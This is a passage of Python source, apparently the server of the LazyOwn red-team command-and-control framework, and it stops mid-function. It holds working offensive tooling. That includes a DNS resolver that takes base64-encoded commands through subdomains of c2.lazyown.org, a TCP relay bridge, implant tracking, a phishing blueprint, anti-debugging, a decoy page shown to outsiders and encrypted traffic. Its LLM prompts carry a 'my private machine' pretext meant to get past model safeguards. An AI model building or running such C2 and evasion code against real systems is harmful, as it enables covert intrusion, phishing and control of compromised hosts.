import re
import os
import csv
import pty
import sys
import ssl
import json
import yaml
import glob
import time
import uuid
import fcntl
import shlex
import socket
import base64
import select
import struct
import yagmail
import smtplib
import secrets
import termios
import sqlite3
import logging
import zipfile
import requests
import markdown
import threading
import validators
import subprocess
import pandas as pd
from math import ceil
from io import StringIO 
from functools import wraps
from threading import Thread
from lazyown import LazyOwnShell
from flask_limiter import Limiter
from urllib.parse import urlparse
from collections import defaultdict
from modules.colors import retModel
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from watchdog.observers import Observer
from datetime import datetime, timezone
from werkzeug.utils import secure_filename
from email.mime.multipart import MIMEMultipart
from dnslib.server import DNSServer, DNSLogger
from jinja2 import Environment, FileSystemLoader
from flask_limiter.util import get_remote_address
from watchdog.events import FileSystemEventHandler
from modules.lazygptcli2 import process_prompt, Groq
from modules.lazygptvulns import process_prompt_vuln
from modules.lazygpttask import process_prompt_task
from modules.lazyredopgpt import process_prompt_redop
from modules.lazyagentAi import process_prompt_search
from modules.lazygptcli3 import process_prompt_script
from modules.lazygptcli5 import process_prompt_general
from cryptography.hazmat.backends import default_backend
from modules.lazygptcli4 import process_prompt_adversary
from flask_socketio import SocketIO, send, emit, disconnect
from modules.lazyphishingai import process_prompt_local_yaml
from dnslib.server import DNSServer, BaseResolver, DNSLogger
from utils import getprompt, Config, load_payload, anti_debug
from modules.lazydeepseekcli_local import process_prompt_local
from modules.lazydeepseekcli_localreport import process_prompt_localreport
from werkzeug.security import generate_password_hash, check_password_hash
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A, TXT, CNAME, MX, NS, SOA, CAA, TLSA, SSHFP
from dnslib.dns import RR, QTYPE, A, NS, SOA, TXT, CNAME, MX, AAAA, PTR, SRV, NAPTR, CAA, TLSA, SSHFP
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from flask import Flask, request, render_template, redirect, url_for, jsonify, Response, send_from_directory, render_template_string, flash, abort, jsonify, Response, stream_with_context, Blueprint, send_file, current_app

anti_debug()
logger = logging.getLogger(__name__)


config = Config(load_payload())
phishing_bp = Blueprint('phishing', __name__, template_folder='templates/phishing')

if config.enable_c2_debug == True:
    logging.basicConfig(filename='sessions/access.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
else:
    logging.basicConfig(filename='sessions/access.log', level=logging.CRITICAL, format='%(asctime)s - %(levelname)s - %(message)s')

def clean_expired_tokens():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM auth_tokens WHERE expiry < ?', (int(time.time()),))
    conn.commit()
    conn.close()

def clean_json(texto):
    """Extract only the JSON content between ```json and ```, discarding everything else."""
    match = re.search(r'```json\n(.*?)\n```', texto, re.DOTALL)
    if match:
        return match.group(1).strip()
    return ""

def load_yaml_safely(file_path):
    """Load a YAML file safely with error handling and default values."""
    try:
        with open(file_path, 'r') as f:
            data = yaml.safe_load(f)
            if not data:
                logger.error(f"Empty YAML file: {file_path}")
                return None

            data.setdefault('beacon_url', '')
            data.setdefault('created_at', datetime.now(timezone.utc).isoformat())
            return data
    except yaml.YAMLError as e:
        logger.error(f"Invalid YAML in {file_path}: {e}")
        return None
    except FileNotFoundError:
        logger.error(f"YAML file not found: {file_path}")
        return None
    except Exception as e:
        logger.error(f"Error loading YAML {file_path}: {e}")
        return None
class Handler(FileSystemEventHandler):
    @staticmethod
    def on_any_event(event):
        try:
            if event.is_directory:
                return None

            event_info = {
                "type": event.event_type,
                "src_path": event.src_path,
                "dest_path": getattr(event, 'dest_path', None),
                "size": os.path.getsize(event.src_path) if os.path.exists(event.src_path) else None,
                "timestamp": datetime.now().isoformat()
            }
            if event.src_path.startswith(f"{BASE_DIR}{rhost}"):
                global counter_events
                global events
                counter_events += 1
                events.append(event_info)
                if counter_events >= 1000:
                    events.sort(key=lambda x: x['timestamp'], reverse=True)
                    events = events[:1000]
        except Exception as e:
            if config.enable_c2_debug == True:
                logger.info(f"Error watchdog")

def get_karma_name(elo):
    if elo < 1000:
        return "Noob"
    elif elo < 2000:
        return "Rookie"
    elif elo < 3000:
        return "Skidy"
    elif elo < 4000:
        return "Hacker"
    elif elo < 5000:
        return "Pro"
    elif elo < 6000:
        return "Elite"
    else:
        return "Godlike"

def fromjson(value):
    return json.loads(value)

def run_shell():
    while True:
        try:
            shell.cmdloop()
        except Exception as e:
            if config.enable_c2_debug == True:
                logger.info(f"[ERROR] Shell loop crashed:")
            break

def load_banners():
    """Loads the banners from the JSON file."""
    try:
        with open('sessions/banners.json', 'r') as file:
            config_banner = json.load(file)
    except FileNotFoundError:
        if config.enable_c2_debug == True:
            logger.info("Error: File banners.json not found")
        return
    return config_banner

def load_mitre_data():
    mitre_path = os.path.join("external", ".exploit", "mitre", "enterprise-attack", "enterprise-attack-16.1.json")
    with open(mitre_path, "r") as f:
        return json.load(f)

def load_event_config():
    try:
        with open('event_config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"events": []}

def load_notifications():
    JSON_FILE_PATH = 'sessions/notifications.json'
    if not os.path.exists(JSON_FILE_PATH):
        with open(JSON_FILE_PATH, 'w') as f:
            json.dump([], f)
    with open(JSON_FILE_PATH, 'r') as f:
        notifications = json.load(f)
    return notifications

def implants_check():
    implants["implants"].clear()

    implant_files = glob.glob(os.path.join(BASE_DIR, 'implant_config*.json'))
    logging.info(implant_files)
    if implant_files:
        for i, file in enumerate(implant_files, start=1):
            try:
                with open(file, 'r') as f:
                    logging.info("Info: Implants created.")
                    content = f.read().strip()
                    implants["implants"].append({
                        "implant": i,
                        "content": content
                    })
            except Exception as e:
                if config.enable_c2_debug == True:
                    logger.info(f"[Error] reading file")

def extract_attack_vectors(nodes, edges):
    """
    Analyzes BloodHound nodes and edges to extract critical attack vectors for AD compromise.

    Args:
        nodes (list): List of node dictionaries from process_bloodhound_zip.
        edges (list): List of edge dictionaries from process_bloodhound_zip.

    Returns:
        dict: Structured data containing critical attack vectors.
    """
    ad_data = {
        'privileged_accounts': [],
        'dangerous_permissions': [],
        'potential_attack_paths': [],
        'misconfigurations': []
    }

    
    for node in nodes:
        if node.get('type') in ['User', 'Group'] and node.get('label', '').lower() in [
            'domain admins', 'enterprise admins', 'administrators'
        ]:
            ad_data['privileged_accounts'].append({
                'id': node['id'],
                'label': node['label'],
                'type': node['type'],
                'details': node['title']
            })

    
    dangerous_rights = ['GenericAll', 'WriteDacl', 'WriteOwner', 'Owns', 'AllExtendedRights', 'DCSync']
    for edge in edges:
        if edge['label'] in dangerous_rights:
            source_node = next((n for n in nodes if n['id'] == edge['from']), None)
            target_node = next((n for n in nodes if n['id'] == edge['to']), None)
            if source_node and target_node:
                ad_data['dangerous_permissions'].append({
                    'from': source_node['label'],
                    'to': target_node['label'],
                    'right': edge['label'],
                    'source_type': source_node['type'],
                    'target_type': target_node['type']
                })

    
    domain_admin_group = next(
        (n for n in nodes if n.get('label', '').lower() == 'domain admins'), None
    )
    if domain_admin_group:
        paths = []
        for edge in edges:
            if edge['to'] == domain_admin_group['id'] and edge['label'] == 'MemberOf':
                source_node = next((n for n in nodes if n['id'] == edge['from']), None)
                if source_node:
                    paths.append({
                        'path': f"{source_node['label']} -> Domain Admins",
                        'type': source_node['type'],
                        'details': f"{source_node['type']} has direct membership to Domain Admins"
                    })
            
            if edge['label'] in ['AdminTo', 'DCSync']:
                source_node = next((n for n in nodes if n['id'] == edge['from']), None)
                target_node = next((n for n in nodes if n['id'] == edge['to']), None)
                if source_node and target_node:
                    paths.append({
                        'path': f"{source_node['label']} -> {target_node['label']}",
                        'type': edge['label'],
                        'details': f"{source_node['type']} has {edge['label']} rights on {target_node['type']}"
                    })
        ad_data['potential_attack_paths'] = paths

    
    for node in nodes:
        if node.get('type') == 'Computer':
            properties = json.loads(node.get('title', '{}'))
            if properties.get('unconstraineddelegation', False):
                ad_data['misconfigurations'].append({
                    'label': node['label'],
                    'type': 'Unconstrained Delegation',
                    'details': 'Computer allows unconstrained delegation, enabling potential privilege escalation.'
                })

    return ad_data

def process_bloodhound_zip(zip_filepath):
    """
    Processes a BloodHound ZIP file to extract nodes and edges for graph visualization.

    Args:
        zip_filepath (str): The path to the BloodHound ZIP file.

    Returns:
        tuple: (nodes, edges, error_message, ad_data). Nodes, edges, attack vectors for viz.js, and error message.
    """
    nodes_data = {}
    edges_data = []
    error_message = None

    try:
        with zipfile.ZipFile(zip_filepath, 'r') as zip_ref:
            json_files = [name for name in zip_ref.namelist() if name.endswith(".json")]
            if not json_files:
                return [], [], "No JSON files found in the ZIP", {}

            for name in json_files:
                with zip_ref.open(name) as f:
                    try:
                        data = json.load(f)
                        if config.enable_c2_debug == True:
                            logger.info(f"Processing file: {name}")
                        if config.enable_c2_debug == True:
                            logger.info(f"Data structure: {json.dumps(data, indent=2)[:500]}...")  

                        items = data.get('data', []) if isinstance(data, dict) else data

                        if not isinstance(items, list):
                            if config.enable_c2_debug == True:
                                logger.info(f"Unexpected data structure in {name}: {type(items)}")
                            continue

                        for item in items:
                            if 'ObjectIdentifier' in item and 'Properties' in item:
                                node_id = item['ObjectIdentifier']
                                if node_id not in nodes_data:
                                    properties = item['Properties']
                                    nodes_data[node_id] = {
                                        'id': node_id,
                                        'label': properties.get('name', node_id),
                                        'title': json.dumps(properties, indent=2),
                                        'type': name.split('_')[1].replace('.json', '')  
                                    }

                            if 'Aces' in item and isinstance(item['Aces'], list):
                                for ace in item['Aces']:
                                    if 'PrincipalSID' in ace and 'RightName' in ace:
                                        edges_data.append({
                                            'from': item['ObjectIdentifier'],
                                            'to': ace['PrincipalSID'],
                                            'label': ace['RightName']
                                        })

                            if 'PrimaryGroupSID' in item and item['PrimaryGroupSID']:
                                edges_data.append({
                                    'from': item['ObjectIdentifier'],
                                    'to': item['PrimaryGroupSID'],
                                    'label': 'MemberOf'
                                })

                    except json.JSONDecodeError as e:
                        if config.enable_c2_debug == True:
                            logger.info(f"Error decoding JSON in {name}: {str("")}")
                        error_message = f"Error decoding JSON in {name}: {str("")}"
                    except Exception as e:
                        if config.enable_c2_debug == True:
                            logger.info(f"Error processing {name}: {str("")}")
                        error_message = f"Error processing {name}: {str("")}"

        if not nodes_data and not edges_data:
            error_message = "No valid nodes or edges extracted from the ZIP"


        ad_data = extract_attack_vectors(list(nodes_data.values()), edges_data)

    except FileNotFoundError:
        error_message = f"File not found: {zip_filepath}"
        logger.info(error_message)
        ad_data = {}
    except zipfile.BadZipFile:
        error_message = f"Invalid or corrupted ZIP file: {zip_filepath}"
        logger.info(error_message)
        ad_data = {}
    except Exception as e:
        error_message = f"An unexpected error occurred: {str("")}"
        logger.info(error_message)
        ad_data = {}

    return list(nodes_data.values()), edges_data, error_message, ad_data

def start_watching():
    event_handler = Handler()
    observer = Observer()
    observer.schedule(event_handler, DIRECTORY_TO_WATCH, recursive=True)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except:
        observer.stop()
    observer.join()

def load_tasks():
    if not os.path.exists('sessions/tasks.json'):
        with open('sessions/tasks.json', 'w') as file:
            json.dump([], file)
    with open('sessions/tasks.json', 'r') as file:
        return json.load(file)

def create_cves():
    if not os.path.exists('sessions/cves.json'):
        with open('sessions/cves.json', 'w') as json_file:
            return json.dump({}, json_file)   

def load_cves():
    if not os.path.exists('sessions/cves.json'):
        with open('sessions/cves.json', 'w') as file:
            json.dump([], file)
    with open('sessions/cves.json', 'r') as file:
        return json.load(file)
    

def save_cves(cves):
    with open('sessions/cves.json', 'w') as file:
        json.dump(cves, file, indent=4)


         
def create_report():
    if not os.path.exists(JSON_FILE_PATH_REPORT):
        with open(JSON_FILE_PATH_REPORT, 'w') as json_file:
            return json.dump({}, json_file)    

def save_tasks(tasks):
    with open('sessions/tasks.json', 'w') as file:
        json.dump(tasks, file, indent=4)


def load_note():
    file_path = 'sessions/notes.txt'
    if not os.path.exists(file_path):
        with open(file_path, 'w') as file:
            file.write(json.dumps({"content": ""}))

    with open(file_path, 'r') as file:
        notes = file.read().strip()

    if not notes:
        return {"content": ""}

    try:
        return json.loads(notes)
    except json.JSONDecodeError:
        return {"content": ""}

def aumentar_elo(user_id, cantidad):
    if os.path.exists(USER_DATA_PATH):
        with open(USER_DATA_PATH, 'r') as file:
            users = json.load(file)
    else:
        users = []

    usuario = next((user for user in users if user['id'] == user_id), None)

    if usuario:

        usuario['elo'] += cantidad
        logger.info(f"The Elo of user {usuario['username']} Increased in {usuario['elo']}.")

        with open(USER_DATA_PATH, 'w') as file:
            json.dump(users, file, indent=4)
    else:
        logger.info(f"User ID {user_id} not found.")

def save_note(content):
    file_path = 'sessions/notes.txt'
    with open(file_path, 'w') as file:
        file.write(json.dumps({"content": content}))
       
def escape_js(s):
    return json.dumps(s)[1:-1]

def markdown_to_html(text):
    if text:
        text_with_br = text.replace('\n', '<br />')
        html_content = markdown.markdown(text_with_br, extensions=['extra'])
    else:
        return escape_js("")    
    return html_content

def to_serializable(obj):
    """Convert objects to serializable format."""
    if isinstance(obj, (list, dict, str, int, float, bool, type(None))):
        return obj
    return str(obj)

def make_serializable(data):
    """Recursively convert data to serializable format."""
    if isinstance(data, dict):
        return {k: make_serializable(v) for k, v in data.items()}
    elif isinstance(data, list):
        return [make_serializable(item) for item in data]
    else:
        return to_serializable(data)

def escape_js_string(value):
    """Escape special characters in a string for JavaScript."""
    if isinstance(value, str):
        value = re.sub(r'([\\"\'])', r'\\\1', value)
        value = re.sub(r'\n', r'\\n', value)
        value = re.sub(r'\r', r'\\r', value)
    return value

def strip_ansi(s):
    ansi_regex = re.compile(r'[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]')
    return ansi_regex.sub('', s)

def check_auth(username, password):
    """Verifica si el usuario y contraseña son correctos"""
    return username == USERNAME and password == PASSWORD

def authenticate():
    """Solicita autenticación"""
    return Response(
        'Invalid credentials. Please provide valid username and password.\n',
        401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'}
    )

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

def aicmd_deepseek(cmd):
    if cmd == 'ping':
        ping = shell.one_cmd("ping")
        ping = strip_ansi(ping)
        return ping

    cmd_string = cmd
    commands = [
        {
            "ping": {
                "content_system": "You are a bot and the mission is identify if the target is alive and the os or if is offline. give me the result of the command",
                "content_user": "the host is alive and what os is?",
                "func_desc": "Evaluate if the host is a live or not and the host os",
                "command_desc": "The command to evaluate the target",
            }
        },
        {
            "gospider ssl": {
                "content_system": "You are a bot and the mission is to analyze the result of the gospider tool and provide info helpfull to the user, the test is on my machine private and i only have access",
                "content_user": "what routes is interesting in redteam context",
                "func_desc": "send a spider to web scrap a host or url",
                "command_desc": "The command to webscaping with gospider to the target",
            }
        }
    ]
    command_info = None
    for command in commands:
        if cmd_string in command:
            command_info = command[cmd_string]
            break

    if not command_info:
        return "Command not found"

    messages = [
        {
            "role": "system",
            "content": command_info["content_system"]
        },
        {
            "role": "user",
            "content": command_info["content_user"],
        }
    ]

    tools = [
        {
            "type": "function",
            "function": {
                "name": "shell.one_cmd",
                "description": command_info["func_desc"],
                "parameters": {
                    "type": "object",
                    "properties": {
                        "command": {
                            "type": "string",
                            "description": command_info["command_desc"],
                        }
                    },
                    "required": ["command"],
                },
            },
        }
    ]

    logging.info("Sending request to DeepSeek")
    response = requests.post(
        "http://localhost:11434/api/generate",
        json={
            "model": "deepseek-r1:1.5b",
            "prompt": json.dumps(messages),
            "stream": False
        }
    )

    if response.status_code == 200:
        response_message = response.json().get("response", "")
        tool_calls = json.loads(response_message).get("tool_calls", [])

        if tool_calls:
            available_functions = {
                "shell.one_cmd": shell.one_cmd,
            }

            messages.append({"role": "assistant", "content": response_message})

            for tool_call in tool_calls:
                function_name = tool_call["function"]["name"]
                function_to_call = available_functions[function_name]
                function_args = json.loads(tool_call["function"]["arguments"])

                function_response = function_to_call(
                    command=cmd_string
                )

                messages.append(
                    {
                        "tool_call_id": tool_call["id"],
                        "role": "tool",
                        "name": function_name,
                        "content": function_response,
                    }
                )

            second_response = requests.post(
                "http://localhost:11434/api/generate",
                json={
                    "model": "deepseek-r1:1.5b",
                    "prompt": json.dumps(messages),
                    "stream": False
                }
            )

            if second_response.status_code == 200:
                response_bot = second_response.json().get("response", "")
                return response_bot
            else:
                return f"Error in second request: {second_response.status_code}"
        else:
            return response_message
    else:
        return f"Error in first request: {response.status_code}"

def aicmd(cmd):
    #if cmd == 'ping':
    #ping = shell.one_cmd("ping")
    #ping = strip_ansi(ping)
    #return ping


    cmd_string = cmd
    commands = [
        {
            "ping": {
                "content_system": "You are a bot and the mission is identify if the target is alive and the os or if is offline. give me the result of the command",
                "content_user": "the host is alive and what os is?",
                "func_desc": "Evaluate if the host is a live or not and the host os",
                "command_desc": "The command to evaluate the target",
            }
        },
        {
            "gospider ssl": {
                "content_system": "You are a bot and the mission is to analyze the result of the gospider tool and provide info helpfull to the user, the test is on my machine private and i only have access",
                "content_user": "what routes is interesting in redteam context",
                "func_desc": "send a spider to web scrap a host or url",
                "command_desc": "The command to webscaping with gospider to the target",
            }
        }
    ]
    command_info = None
    for command in commands:
        if cmd_string in command:
            command_info = command[cmd_string]
            break

    if not command_info:
        return "Command not found"

    messages = [
        {
            "role": "system",
            "content": command_info["content_system"]
        },
        {
            "role": "user",
            "content": command_info["content_user"],
        }
    ]

    tools = [
        {
            "type": "function",
            "function": {
                "name": "shell.one_cmd",
                "description": command_info["func_desc"],
                "parameters": {
                    "type": "object",
                    "properties": {
                        "command": {
                            "type": "string",
                            "description": command_info["command_desc"],
                        }
                    },
                    "required": ["command"],
                },
            },
        }
    ]
    logging.info(MODEL)
    response = client.chat.completions.create(
        model=MODEL,
        messages=messages,
        stream=False,
        tools=tools,
        tool_choice="auto",
    )

    response_message = response.choices[0].message
    tool_calls = response_message.tool_calls

    if tool_calls:
        available_functions = {
            "shell.one_cmd": shell.one_cmd,
        }

        messages.append(response_message)

        for tool_call in tool_calls:
            function_name = tool_call.function.name
            function_to_call = available_functions[function_name]
            function_args = json.loads(tool_call.function.arguments)

            function_response = function_to_call(
                command=cmd_string
            )

            messages.append(
                {
                    "tool_call_id": tool_call.id,
                    "role": "tool",
                    "name": function_name,
                    "content": function_response,
                }
            )

        second_response = client.chat.completions.create(
            model=MODEL,
            messages=messages
        )

        response_bot = second_response.choices[0].message.content
        return response_bot

def search_database(term, data_path="parquets/techniques.parquet"):
    """
    Busca un término en un DataFrame, manejando listas y structs correctamente.

    Args:
        term (str): El término de búsqueda.
        data_path (str, optional): Ruta al archivo Parquet.

    Returns:
        str: Contenido Markdown de los resultados, o mensaje de error.
    """
    try:
        df = pd.read_parquet(data_path)
    except FileNotFoundError:
        return f"Error: File not found"
    except ValueError as e:
        return f"Error reading Parquet"

    for col in df.columns:
        if df[col].apply(lambda x: isinstance(x, list)).any():
            df[col] = df[col].apply(lambda x: ', '.join(map(str, x)) if isinstance(x, list) else x)

    struct_cols_to_drop = []
    for col in df.columns:
        if df[col].apply(lambda x: isinstance(x, dict)).any():
            struct_cols_to_drop.append(col)
            df = pd.concat([df.drop(columns=[col]), df[col].apply(pd.Series).add_prefix(f"{col}.")], axis=1)

    term_lower = term.lower()
    results = df[df.apply(lambda row: row.astype(str).str.lower().str.contains(term_lower).any(), axis=1)]

    md_content = ""
    if not results.empty:
        for _, row in results.iterrows():
            md_content += f"# Result {_ + 1}\n"
            for key, value in row.items():
                md_content += f"- **{key}**: {value}\n"
            md_content += "\n"
    else:
        md_content = f"No Results for: '{term}'\n"

    return md_content


def execute_command(command):
    try:
        result = subprocess.run(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=10
        )
        return result.stdout + result.stderr
    except Exception as e:
        return str("audio")

class CustomDNSResolver(BaseResolver):
    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname)
        qtype = request.q.qtype

        
        logger.info(f"Consulta recibida: {qname} (Tipo: {QTYPE[qtype]})")

        
        subdomain = qname.replace(".c2.lazyown.org.", "").rstrip('.')

        
        subdomain_responses = {
            "info.esporalibre.cl.": {
                QTYPE.A: A("192.168.1.98"),
                QTYPE.TXT: TXT("Información sobre esporalibre.cl")
            },
            "mail.esporalibre.cl.": {
                QTYPE.A: A("192.168.1.98"),
                QTYPE.MX: MX("mail.esporalibre.cl.")
            },
            "www.esporalibre.cl.": {
                QTYPE.A: A("192.168.1.98"),
                QTYPE.CNAME: CNAME("esporalibre.cl.")
            },
            "ns.esporalibre.cl.": {
                QTYPE.NS: NS("ns.esporalibre.cl.")
            },
            "esporalibre.cl.": {
                QTYPE.SOA: SOA(
                    "ns.esporalibre.cl.",
                    "admin.esporalibre.cl.",
                    (1, 3600, 600, 86400, 3600)
                ),
                QTYPE.MX: MX("mail.esporalibre.cl."),
                QTYPE.TXT: TXT("v=spf1 include:_spf.google.com ~all"),
                QTYPE.CAA: CAA(0, "issue", "letsencrypt.org"),
                QTYPE.TLSA: TLSA(1, 1, 1, b"your_tlsa_data"),
                QTYPE.SSHFP: SSHFP(1, 1, b"your_sshfp_data")
            },
            
            "c2.lazyown.org.": {
                QTYPE.A: A("127.0.0.1"),  
                QTYPE.TXT: TXT("Servidor C2 activo")
            }
        }

        
        if qname in subdomain_responses:
            if qtype in subdomain_responses[qname]:
                reply.add_answer(RR(qname, qtype, rdata=subdomain_responses[qname][qtype], ttl=300))
                logger.info(f"Respuesta predefinida enviada para {qname}")
            else:
                reply.header.rcode = 3  
                logger.warning(f"Tipo de consulta no soportado para {qname}: {QTYPE[qtype]}")
        else:
            
            if qname.endswith("c2.lazyown.org."):
                try:
                    
                    command = base64.urlsafe_b64decode(subdomain + "==").decode('utf-8') 
                    logger.info(f"Comando recibido: {command}")

                    
                    if command.startswith("exec:"):
                        output = f"Ejecutado: {command[5:]}"
                        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(output), ttl=60))
                        logger.info(f"Respuesta enviada: {output}")
                    else:
                        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("Comando no reconocido"), ttl=60))
                        logger.warning(f"Comando no reconocido: {command}")

                except Exception as e:
                    logger.error(f"Error:")
                    reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("Error en el comando"), ttl=60))
            else:
                
                reply.header.rcode = 3  
                logger.warning(f"Dominio no reconocido: {qname}")

        return reply

def start_dns_server():
    resolver = CustomDNSResolver()
    logger.info("Iniciando servidor DNS en el puerto 53...")
    server = DNSServer(resolver, port=53, address="0.0.0.0")
    server.start()

def tcp_bridge(local_port, remote_host, remote_port):
    """Establish a TCP bridge between a local port and a remote host."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', local_port))
    server_socket.listen(5)
    logger.info(f"[*] Listening for connections on port {local_port}...")

    while True:
        client_socket, addr = server_socket.accept()
        logger.info(f"[INFO] Accepted connection from {addr}")

        threading.Thread(target=handle_client, args=(client_socket, remote_host, remote_port)).start()

def handle_client(client_socket, remote_host, remote_port):
    """Handle communication between the client and the remote server."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.connect((remote_host, remote_port))

        while True:

            client_data = client_socket.recv(4096)
            if not client_data:
                break
            server_socket.sendall(client_data)

            server_data = server_socket.recv(4096)
            if not server_data:
                break
            client_socket.sendall(server_data)

    client_socket.close()

def decoy():
    client_ip = request.remote_addr
    logging.info(f"[INFO]: IP {client_ip}")
    if (client_ip != lhost) and (client_ip != '127.0.0.1'):
        return render_template('decoy.html')
    return None

def encrypt_data(data):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(data) + encryptor.finalize()
    combined = iv + encrypted_data 
    return base64.b64encode(combined).decode('utf-8')  

def decrypt_data(encrypted_data, is_file = False):
    encrypted_data = base64.b64decode(encrypted_data)
    iv = encrypted_data[:16]
    encrypted_data = encrypted_data[16:]
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    if is_file:
        return decrypted_data
    else:
        return decrypted_data.decode('utf-8')

def set_winsize(fd, row, col, xpix=0, ypix=0):
    """Configura el tamaño de la terminal"""
    winsize = struct.pack("HHHH", row, col, xpix, ypix)
    fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)

def read_and_forward_pty_output():
    """Lectura continua del PTY y envío por WebSocket"""
    max_read_bytes = 1024 * 20
    while True:
        socketio.sleep(0.01)
        if app.config["fd"]:
            try:
                timeout_sec = 0
                (data_ready, _, _) = select.select([app.config["fd"]], [], [], timeout_sec)
                if data_ready:
                    output = os.read(app.config["fd"], max_read_bytes)
                    if output:
                        socketio.emit("pty-output", {"output": output.decode(errors="replace")}, namespace="/pty")
            except Exception as e:
                logger.error(f"Error leyendo salida:")
                
def read_and_forward_pty_output_c2():
    max_read_bytes = 1024 * 20
    while True:
        socketio.sleep(0.01)
        if app.config["fd"]:
            timeout_sec = 0
            (data_ready, _, _) = select.select([app.config["fd"]], [], [], timeout_sec)
            if data_ready:
                output = os.read(app.config["fd"], max_read_bytes).decode(errors="replace")
                socketio.emit('output', {'data': output}, namespace='/terminal')
         
def get_discovered_hosts():
    """
    Reads the sessions/hostsdiscovery.txt file and returns a list of discovered hosts.
    Also reads IPs from scan_discovery*.csv files in the sessions directory.
    """
    hosts_file_path = os.path.join('sessions', 'hostsdiscovery.txt')
    discovered_hosts = []
    local_ips = get_local_ip_addresses()

    try:
        with open(hosts_file_path, 'r') as f:
            for line in f:
                ip_address = line.strip()
                if ip_address and ip_address not in local_ips and ip_address not in discovered_hosts:
                    discovered_hosts.append(ip_address)
        if isinstance(local_ips, str):
            if local_ips not in discovered_hosts:
                discovered_hosts.append(local_ips)
        elif isinstance(local_ips, list):
            for ip in local_ips:
                if ip not in discovered_hosts:
                    discovered_hosts.append(ip)
        elif isinstance(local_ips, str):
            if local_ips not in discovered_hosts:
                discovered_hosts.append(local_ips)
    except FileNotFoundError:
        logger.info(f"Error: File not found at {hosts_file_path}")

    scan_files = glob.glob(os.path.join('sessions', 'scan_discovery*.csv'))
    if scan_files:
        for file_path in scan_files:
            try:
                with open(file_path, 'r') as f:
                    next(f)
                    for line in f:
                        line = line.strip()
                        if line:
                            parts = line.split(';')
                            if len(parts) > 0:
                                ip_address = parts[0].strip('"')
                                if ip_address and ip_address not in local_ips and ip_address not in discovered_hosts:
                                    discovered_hosts.append(ip_address)
            except FileNotFoundError:
                logger.info(f"Error: Scan discovery file not found at {file_path}")
            except Exception as e:
                logger.info(f"Error reading scan discovery file {file_path}")

    return discovered_hosts

def get_local_ip_addresses():
    local_ips = []
    try:
        process = subprocess.run(['ip', 'addr'], capture_output=True, text=True, check=True)
        output = process.stdout

        for line in output.splitlines():
            if 'inet ' in line:
                parts = line.split()
                ip_address = parts[1].split('/')[0]
                if ip_address != "127.0.0.1":
                    if ('eth0' in line or 'wlan0' in line or 'tun0' in line or 'br-' in line):
                        local_ips.append(ip_address)
                    elif 'lo' not in line and not any(prefix in line for prefix in ['docker', 'veth']):
                        local_ips.append(ip_address)

        if not local_ips:
            return "No se pudo obtener la IP del servidor desde el sistema operativo."
        return local_ips
    except subprocess.CalledProcessError as e:
        return f"Error al ejecutar el comando:"
    except FileNotFoundError:
        return "El comando 'ip' no se encontró en el sistema."

def sanitize_json(data):
    """
    Elimina datos sensibles del diccionario JSON.
    Adaptar esta función según la estructura específica de tu payload.json.
    """
    if isinstance(data, dict):
        keys_to_remove = ["c2_user", "c2_pass", "api_key", "telegram_token", "discord_token", "start_user", "start_pass", "rat_key", "email_from", "email_password", "email_username"]
        for key in list(data.keys()):  
            if key in keys_to_remove or "secret" in key.lower():
                del data[key]
            elif isinstance(data[key], (dict, list)):
                data[key] = sanitize_json(data[key])
        return data
    elif isinstance(data, list):
        return [sanitize_json(item) for item in data]
    return data

def add_dynamic_data(data):
    """
    Agrega datos dinámicos al diccionario JSON si es necesario,
    basándose en el contenido del diccionario 'data'.
    """
    data['timestamp'] = 'now' 

    return data
def get_client_ip():
    """Get the client's IP address, handling proxies."""
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    else:
        ip = request.remote_addr
    return ip

def get_request_details():
    """Collect comprehensive request details."""
    timestamp = datetime.now(timezone.utc).isoformat()
    parsed_url = urlparse(request.url)
    query_string = parsed_url.query
    headers = dict(request.headers)
    form_data = request.form.to_dict() if request.form else {}
    json_data = request.get_json(silent=True) or {}
    args = request.args.to_dict()
    method = request.method
    path = parsed_url.path
    host = parsed_url.hostname or socket.gethostname()
    user_agent = headers.get('User-Agent', 'Unknown')
    referrer = headers.get('Referer', 'Unknown')
    cookies = request.cookies

    return {
        'id': SESSION_ID,
        'timestamp': timestamp,
        'method': method,
        'url': request.url,
        'path': path,
        'query_string': query_string,
        'query_params': args,
        'form_data': form_data,
        'json_data': json_data,
        'client_ip': get_client_ip(),
        'host': host,
        'headers': headers,
        'user_agent': user_agent,
        'referrer': referrer,
        'cookies': cookies
    }

def save_to_log(data):
    """Append request data to the JSON log file."""
    try:
        with open(LOG_FILE, 'a') as f:
            json.dump(data, f, indent=2)
            f.write('\n')
    except Exception as e:
        return {'error': f'Failed to save log:'}, 500

def parse_access_log_for_short_url(short_url):
    """Parse access.log for entries matching the given short URL."""
    download_events = []
